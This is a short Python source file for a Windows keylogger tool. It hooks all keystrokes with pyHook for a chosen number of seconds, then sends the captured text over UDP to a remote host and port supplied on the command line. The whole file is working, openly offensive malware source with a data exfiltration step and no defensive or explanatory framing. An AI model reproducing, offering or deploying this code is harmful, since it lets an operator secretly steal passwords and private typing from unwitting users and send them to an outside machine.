# -*- coding: utf-8 -*-

""" Windows Key Logger Tool

Usage:

  $ python win-key-logger.py [-h|--help]

"""
import argparse
import os
import pyHook
import pythoncom
import socket
import time


LOG = []


def get_command_line_parser():
  """ Returns a command line parser for the Windows key logger tool.

  Returns:
    argparse.ArgumentParser: A command line parser.
  """
  parser = argparse.ArgumentParser()

  parser.add_argument(
    'duration',
    type=int,
    help='the total number of seconds to run the key logger for',
  )

  parser.add_argument(
    'host_name',
    type=str,
    help='the host name of the machine receiving the logged keystrokes',
  )

  parser.add_argument(
    'port_number',
    type=int,
    help='the port number of the machine receiving the logged keystrokes',
  )

  return parser


def keyboard_hook(event):
  """ Keyboard key down hook function.

  Args:
    event (object): A keyboard key down event object.

  Returns:
    bool: True.
  """
  global LOG
  LOG.append(chr(event.Ascii))

  return True


def main():
  """ Runs the Windows key logger tool. """
  parser = get_command_line_parser()
  args = parser.parse_args()

  hook_manager = pyHook.HookManager()
  hook_manager.KeyDown = keyboard_hook
  hook_manager.HookKeyboard()

  start = time.time()

  while time.time() - start < args.duration:
    pythoncom.PumpWaitingMessages()

  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect((args.host_name, args.port_number))
  s.send(''.join(LOG))
  s.close()


if __name__ == '__main__':
  main()

